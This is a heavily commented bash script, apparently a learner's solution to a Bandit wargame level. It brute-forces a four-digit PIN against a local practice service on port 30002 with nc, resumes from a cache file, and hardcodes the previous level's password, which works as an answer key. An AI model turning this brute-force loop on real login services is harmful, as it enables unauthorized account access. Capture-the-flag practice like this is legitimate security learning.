#!/bin/bash

BANDIT24_PASSWORD=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ  # password for bandit24 used against the bandit25 to auth
LAST_NUM_FILE="/tmp/cm/last" # cache file
LAST_NUM=`cat /tmp/cm/last` # cache file call
RESULTS_FILE="/tmp/cm/results"  # results of brute
MAX_PIN=9999 # max pin for script to go to
SERVICE_HOST="localhost" # host that you will be working on
SERVICE_PORT=30002 # port to nc into

for i in `seq $LAST_NUM $MAX_PIN`; # for loop that loops through the LAST_NUM in sequence and ends in MAX_PIN (9999) the seq is necessary because it tells it to start at 1 and go to 9999 so you dont need a start variable. if there is nohting in last num file then you are fine (this is your cache!!)
do
        echo $i > $LAST_NUM_FILE # This is the cahce. it echo's out the looped number into the last num file ( if it were the >> sign it would put every number but instead its the > sign)
        echo "Attempting login with PIN $i..." # echo statement
        printf "$BANDIT24_PASSWORD %04d\n" $i | nc $SERVICE_HOST $SERVICE_PORT >> $RESULTS_FILE # prints out bandit24 password on a newline with the number beside it piped to the nc localhost and service port (localhost:30002) and then append ALL results to the /tmp/cm/results file
        RESULTS=`sort $RESULTS_FILE | uniq -u` # creating a new variable RESULTS to find and contain the uniq word (probably correct!) that has the password
        if [ ${#RESULTS} -gt 2 ] && [ $i != "1" ]; then # if statement (true or false) taking RESULTS greater than 2 and the current number in the for loop not equal to "1"
                echo "PIN is $i" # then echo pin is $i (which is the current number)
                echo $RESULTS # and also echo RESULTS file which will be the actual password
                exit
        fi #close if loop
done # close for loop

# the reason this is so slow is because it is running through the whole script sorting and trying to find the uniq key each time
# testinging
